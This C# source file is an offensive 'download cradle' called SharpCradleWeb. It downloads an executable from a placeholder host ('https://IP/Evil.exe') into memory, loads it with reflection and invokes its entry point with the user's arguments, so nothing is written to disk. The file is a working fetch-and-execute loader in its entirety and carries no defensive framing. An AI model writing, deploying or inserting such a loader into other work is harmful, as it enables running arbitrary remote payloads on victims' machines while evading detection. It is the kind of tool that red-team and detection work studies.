using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;

/*
Author: @anthemtotheego
License: BSD 3-Clause    
*/

namespace SharpCradleWeb
{
    class Program
    {
        static void Main(string[] args)
        {            
                object[] cmd = args.ToArray();
                MemoryStream ms = new MemoryStream();
                using (WebClient client = new WebClient())
                {
                    //Access web and read the bytes from the binary file
                    System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
                    ms = new MemoryStream(client.DownloadData("https://IP/Evil.exe"));
                    BinaryReader br = new BinaryReader(ms);
                    byte[] bin = br.ReadBytes(Convert.ToInt32(ms.Length));
                    ms.Close();
                    br.Close();
                    loadAssembly(bin, cmd);
                }
        }//End Main
        //loadAssembly
        public static void loadAssembly(byte[] bin, object[] commands)
        {
            Assembly a = Assembly.Load(bin);
            try
            {
                a.EntryPoint.Invoke(null, new object[] { commands });
            }
            catch
            {
                MethodInfo method = a.EntryPoint;
                if (method != null)
                {
                    object o = a.CreateInstance(method.Name);
                    method.Invoke(o, null);
                }
            }//End try/catch            
        }//End loadAssembly
    }//End Program
}//End Namespace
